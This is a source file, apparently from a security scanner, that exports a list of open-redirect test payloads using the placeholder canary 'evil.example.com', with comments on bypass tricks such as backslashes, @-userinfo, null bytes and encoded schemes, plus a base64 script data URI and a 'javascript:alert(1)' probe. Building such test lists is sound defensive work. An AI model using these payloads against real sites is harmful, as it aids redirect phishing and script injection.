/**
 * Open redirect test payloads.
 *
 * Ordered from most common bypass to least. Each payload uses "evil.example.com"
 * as the canary domain — detection checks for this string in Location headers
 * and final navigation URLs.
 *
 * Real-world bypass techniques used by bug bounty hunters:
 * - Protocol-relative URLs bypass http-only filters
 * - Backslash URLs bypass regex that only checks forward slashes
 * - @-sign tricks abuse URL userinfo to confuse parsers
 * - Null byte insertion can bypass string-termination checks
 * - Encoded schemes bypass protocol filters
 * - Whitespace/tab bypass split regex patterns
 * - Double-URL encoding bypasses single-decode filters
 */
export const REDIRECT_PAYLOADS = [
  // ── Standard payloads ──
  'https://evil.example.com',
  '//evil.example.com',

  // ── Backslash variations (confuse URL parsers) ──
  '/\\evil.example.com',
  '//evil.example.com/%2f..',
  '\\/\\/evil.example.com',

  // ── @-sign userinfo trick (fools hostname extraction) ──
  'https://legitimate.com@evil.example.com',
  'http://legitimate.com@evil.example.com/',

  // ── Null byte bypass ──
  'https://evil.example.com%00.legitimate.com',

  // ── Whitespace/tab bypass ──
  '//evil.example.com%09',
  '/ /evil.example.com',

  // ── Multiple slash variations ──
  '////evil.example.com',
  '///evil.example.com',

  // ── Scheme encoding bypass ──
  'https:evil.example.com',
  'http:/evil.example.com',

  // ── Data URI (when redirect is used in src/href context) ──
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
  'javascript:alert(1)',
];

/**
 * Canary domain used in all redirect payloads.
 * Detection checks look for this exact string in responses.
 */
export const REDIRECT_CANARY = 'evil.example.com';
